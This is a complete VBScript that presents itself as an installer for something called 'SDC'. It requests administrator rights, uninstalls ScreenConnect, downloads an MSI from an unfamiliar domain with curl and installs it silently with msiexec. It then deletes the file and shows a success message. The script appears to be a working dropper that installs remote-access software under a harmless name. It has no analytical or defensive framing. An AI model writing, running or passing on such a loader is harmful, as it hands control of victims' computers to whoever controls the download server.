Option Explicit

Dim oShell, oFSO, sTempFolder, sMsiURL, sMsiFile
Dim nResult, sMessage

Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
sTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiFile = oFSO.BuildPath(sTempFolder, "sdc.msi")

sMsiURL = "https://seworks.mhawkster01.info/sdc"

If Not IsAdmin() Then
    Elevate()
    WScript.Quit 0
End If

Call UninstallScreenConnect()

If Not DownloadWithCurl(sMsiURL, sMsiFile) Then
    MsgBox "Download failed. Please check your internet connection.", vbCritical, "Download Error"
    WScript.Quit 1
End If

nResult = InstallMSI(sMsiFile)

If oFSO.FileExists(sMsiFile) Then oFSO.DeleteFile(sMsiFile)

If nResult = 0 Then
    MsgBox "SDC has been installed successfully!", vbInformation, "Installation Complete"
Else
    MsgBox "Installation failed with code: " & nResult & vbCrLf & _
           "Please check the installation and try again.", vbCritical, "Installation Failed"
End If

WScript.Quit nResult



Function IsAdmin()
    On Error Resume Next
    Dim oTestShell, oTestFSO, sTestFile
    Set oTestShell = CreateObject("WScript.Shell")
    Set oTestFSO = CreateObject("Scripting.FileSystemObject")
    sTestFile = oTestShell.ExpandEnvironmentStrings("%SystemRoot%\System32\admin_test.tmp")
    oTestFSO.CreateTextFile(sTestFile, True).Close
    oTestFSO.DeleteFile(sTestFile)
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function

Sub Elevate()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
End Sub

Sub UninstallScreenConnect()
    On Error Resume Next
    Dim oWMI, oProducts, oProduct
    
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set oProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%'")
    
    For Each oProduct In oProducts
        oProduct.Uninstall()
    Next
    
    On Error GoTo 0
    Set oWMI = Nothing
    Set oProducts = Nothing
End Sub

Function DownloadWithCurl(sURL, sLocalPath)
    Dim oExec, nExitCode

    Set oExec = oShell.Exec("curl -L -s -o """ & sLocalPath & """ """ & sURL & """")
    oExec.StdOut.ReadAll  
    nExitCode = oExec.ExitCode
    
    DownloadWithCurl = (nExitCode = 0 And oFSO.FileExists(sLocalPath))
End Function

Function InstallMSI(sMSIFile)
    Dim oExec
    
    Set oExec = oShell.Exec("msiexec /i """ & sMSIFile & """ /qn /norestart")
    oExec.StdOut.ReadAll
    InstallMSI = oExec.ExitCode
End Function